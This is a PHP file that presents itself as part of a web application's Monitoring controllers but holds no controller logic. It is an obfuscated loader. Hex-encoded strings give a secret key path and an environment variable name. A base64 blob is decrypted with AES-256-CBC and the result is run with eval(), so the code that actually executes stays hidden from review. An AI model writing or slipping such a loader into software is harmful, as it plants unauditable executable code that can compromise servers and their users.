<?php
namespace App\Http\Controllers\Monitoring;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('v2WuDlqbDte4WOMUICmdEQ==');

$c=base64_decode(

'JFAMoOyRBaP2MxCjouig80HcxtS6O7OrA6Fb+hqJl8DsJTeG1RsP5ha3haX5aq/tQb4GTh7G9Ob6' .
'h+esbjsYGC+Sgl3XMrEEJoZZils8Sp6BUvuPPnL/JAHEIHkc2FuvYe1YUZJ2Eh8QHlCncPRUyQb3' .
'ZDHuttNGnZoo4typwj8juUKugttGVItWZllDPSWr8RfB5gTwQjGwS0/05xM3WLNSRujhl7No2nJT' .
'ujxo0+JYwDMw/eo7F5Aq1cOo32u8vWXzQ9XGTBOkrU1jVC/SsWCEW7VqglDGkrOVUEv0jeceVjyQ' .
'gr7wjw2NA1gc+b3/qLRFh9HFixTBsgEMk7lhXDm6FGGOo6gf1ynM0h1QoBxk/CqKwOjNAlAXvblu' .
'TxMMkVKjYThdcyXtjFQZp68LGdb28GobLRZ2hKICwjinnidiTQFRfAlOR8kh3AnTbTGeymt1c4U/' .
'OW4eN6Y5KDIf4RKf7ujv5CY8NO90gTTHqfc8Rn8x/aQILLFWS5rifL4TPp2yn7G9y/mObpmwqSnR' .
'DmY2oIt3GV08TycXe3CQkO4oCJpwgXY+3UtZQfUPc0CXxuco1plf//c+hFogjejEDthEvx1RGkjf' .
'Z3CY3ABBqEsTAXRdXi+DGJWKBVAhQUiYtVN4+WTPqlsjieFSQKjxxJkINhtoh1p09p6KS8fOKq3I' .
'+GuT8KCr9M+2m56JILQHfnLC4xqbmOrEwQA7Jl/l56X/JUnHv8DMc8FjCuAu1Y7EwFsFtkSnp7Fy' .
'of22obzZStwbKKi6bYv4y7B/wGn/3Q7sTZLZB4gkyFQ/Fq1qMscyoBVx2n1Z9+ce4YbKi9JBFaSW' .
'G7LppButrj9x0EBnlzwRlTmfMMHOMOREMn1EZEalI66qjNBo1RBUqSS9ceQePro3uAD3xqgZxVHp' .
'9mvDJW+dnxAVQ3MUSnhUh/i8C6A1QyRLb5FeJvzCuJs/nsixg9wJNvMxnMewM7Ud75oxq4lYIG92' .
'+yIidfp64upyAlx1RipSQ/XiaFwvI90mqr2m6g7do+LMbOfzHspcICSbSTkQgAvQCnvRKnCvKtVo' .
'uB8T5lWYE9TIJtEPWt3jbXWAo7el9DG7UFT2jzUiZKxb09LobJ3473zEqU4s+v/iGEs19vbMT7yQ' .
'8qTIzXLDZmWvcolA0HK+UWxM3TlZZ3NWhS6ZTNlChc61TZhqqiL8LKJscSvtb+BUJidTTktIAcp+' .
'ueGLc6ln0xrXcYejj5cLgZDo7R4Gp5ztN8WZbggtd30bmAIzZQlbvvIdt6uS01IxXu3a3CuV6sNZ' .
'u3YVM5VTbZxGDZXPvzzHSmID2i05kx9mlaiF6NQcexBq6Gr62ntv6jBGyRr7vLFhvwDMjUvBeKK3' .
'uGM0Nz8uBTR0VqOCxujbly6zFEJGzwcnFQ0TCJBNsf2qsxv67q7h5Fepr6O2t+iy6NYutGx5y0aO' .
'WFvT8BuP+7g3Srn0LIwGKTFgKNPv/R96mMMFt3UZHyip2vSSuz/THrhP79JpPKqsHp5CmjrBuSuG' .
'97ENJ4CE4U+MkyX4/AgO4Yx0u/N6v0aih9N0po9yf7NFWj1YaP5IrxXDbzvjLiJfuNqWaJdn0umM' .
'4PbBnKFRIP5wNZfUCFOIsazLhaJn+tFjNDFDJUnf1seiD7X1v/O/+Z7ZM+4YxPm1QZFsruTpysB3' .
'QkejkEG3tGeUFMS7jP8rvR43oLCfgsIV6CpGWe/ddcEKTPfzAgblyoE6'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

